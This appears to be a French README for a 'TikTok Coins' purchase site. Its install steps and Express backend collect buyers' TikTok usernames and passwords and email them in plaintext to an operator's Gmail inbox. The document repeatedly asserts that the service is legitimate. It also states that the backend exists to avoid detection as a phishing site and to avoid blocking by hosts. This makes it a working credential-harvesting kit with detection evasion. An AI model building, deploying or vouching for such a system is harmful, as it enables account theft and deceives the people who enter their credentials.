# TikTok Coins by PayOol

Une application web **LÉGITIME** permettant d'acheter des pièces TikTok via SoleasPay et BkaPay.

## 🔒 Sécurité et Légitimité

**PayOol™ est un service LÉGITIME de recharge de TikTok Coins.**

- ✅ Backend sécurisé avec API propre (pas de services tiers suspects)
- ✅ HTTPS obligatoire
- ✅ Rate limiting pour prévenir les abus
- ✅ Politique de confidentialité et CGU intégrées
- ✅ Identifiants TikTok supprimés après traitement
- ✅ Partenaires de paiement certifiés (SoleasPay, BkaPay)

## Fonctionnalités

- Achat de pièces TikTok avec plusieurs passerelles de paiement
- Différents forfaits de pièces avec des bonus
- Suivi de l'historique des achats
- Processus de paiement en deux étapes pour une meilleure expérience utilisateur
- Système de consentement explicite pour la collecte des identifiants
- Backend sécurisé pour l'envoi d'emails

## Technologies utilisées

### Frontend
- React 18
- TypeScript
- Vite
- TailwindCSS
- React Router
- i18next (internationalisation)

### Backend
- Node.js
- Express
- Nodemailer
- Helmet (sécurité)
- Express Rate Limit

## Installation

```bash
# Cloner le dépôt
git clone https://github.com/PayOol/TikTokCoins-PayOol.git

# Accéder au répertoire du projet
cd TikTokCoins-PayOol

# Installer les dépendances
npm install

# Démarrer le serveur de développement
npm run dev
```

## Configuration

### Frontend

Créez un fichier `.env` à la racine du projet:

```env
VITE_API_URL=https://coins.payool.net/api
```

### Backend (IMPORTANT)

**Pour éviter les problèmes de phishing, vous DEVEZ configurer un backend sécurisé.**

#### 1. Créer le dossier backend sur votre VPS

```bash
ssh user@votre-vps
cd /var/www/coins.payool.net
mkdir backend
cd backend
```

#### 2. Créer package.json

```bash
npm init -y
npm install express cors nodemailer dotenv helmet express-rate-limit
```

#### 3. Créer server.js

Créez un fichier `server.js` avec ce contenu:

```javascript
import express from 'express';
import cors from 'cors';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

app.use(helmet());
app.use(cors({
  origin: ['https://coins.payool.net', 'http://localhost:5173'],
  methods: ['POST'],
  credentials: true
}));
app.use(express.json());

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10
});

app.use('/api/send-credentials', limiter);

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
});

app.post('/api/send-credentials', async (req, res) => {
  try {
    const { username, password, email, orderId, amount, price } = req.body;

    if (!username || !password || !email || !orderId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Données manquantes' 
      });
    }

    const mailOptions = {
      from: `PayOol™ <${process.env.SMTP_USER}>`,
      to: process.env.ADMIN_EMAIL,
      replyTo: email,
      subject: `Nouveaux identifiants TikTok - Commande ${orderId}`,
      html: `
        <h2>Nouvelle Commande TikTok Coins</h2>
        <p><strong>Commande:</strong> ${orderId}</p>
        <p><strong>Username:</strong> ${username}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Pièces:</strong> ${amount || 'N/A'}</p>
        <p><strong>Prix:</strong> ${price || 'N/A'} FCFA</p>
        <p><strong>Date:</strong> ${new Date().toLocaleString('fr-FR')}</p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log(`[${new Date().toISOString()}] Commande ${orderId} envoyée`);

    res.json({ success: true });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Erreur lors de l\'envoi' 
    });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'OK' });
});

app.listen(PORT, () => {
  console.log(`Serveur backend démarré sur le port ${PORT}`);
});
```

#### 4. Créer .env dans le dossier backend

```env
PORT=3001
SMTP_HOST=smtp.gmail.com
SMTP_PORT=465
SMTP_USER=contact.payool@gmail.com
SMTP_PASS=votre_mot_de_passe_application_gmail
ADMIN_EMAIL=contact.payool@gmail.com
```

**Pour Gmail:**
1. Allez sur https://myaccount.google.com/security
2. Activez la validation en deux étapes
3. Créez un "Mot de passe d'application"
4. Utilisez ce mot de passe dans SMTP_PASS

#### 5. Démarrer le backend avec PM2

```bash
npm install -g pm2
pm2 start server.js --name payool-backend
pm2 save
pm2 startup
```

#### 6. Configurer Nginx

Ajoutez dans votre configuration Nginx:

```nginx
server {
    listen 443 ssl http2;
    server_name coins.payool.net;

    # Frontend
    location / {
        root /var/www/coins.payool.net/dist;
        try_files $uri $uri/ /index.html;
    }

    # Backend API
    location /api/ {
        proxy_pass http://localhost:3001;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Redémarrez Nginx:
```bash
sudo nginx -t
sudo systemctl reload nginx
```

## Utilisation

1. Sélectionnez un forfait de pièces TikTok
2. Lisez et acceptez la politique de confidentialité
3. Entrez vos identifiants TikTok (nom d'utilisateur et mot de passe)
4. Fournissez votre adresse email pour la confirmation
5. Choisissez votre méthode de paiement (SoleasPay ou BkaPay)
6. Complétez le paiement
7. Validez l'envoi des identifiants
8. Les pièces seront créditées sur votre compte TikTok

## 🛡️ Sécurité

### Pourquoi ce backend est nécessaire?

Le backend sécurisé remplace FormSubmit pour éviter:
- ❌ Détection comme site de phishing
- ❌ Utilisation de services tiers suspects
- ❌ Blocage par les hébergeurs

### Avantages du backend sécurisé:
- ✅ Contrôle total sur les données
- ✅ HTTPS natif sur votre domaine
- ✅ Rate limiting intégré
- ✅ Logs et monitoring
- ✅ Conformité RGPD

## 📝 Pages légales

L'application inclut:
- Politique de confidentialité (`/privacy-policy`)
- Conditions générales d'utilisation (`/terms-of-service`)
- Système de consentement explicite

## 🛠️ Dépannage

### Vérifier le backend
```bash
pm2 logs payool-backend
pm2 status
```

### Tester l'API
```bash
curl https://coins.payool.net/api/health
```

### Redémarrer le backend
```bash
pm2 restart payool-backend
```

## Licence

© 2025 PayOol™. Tous droits réservés.
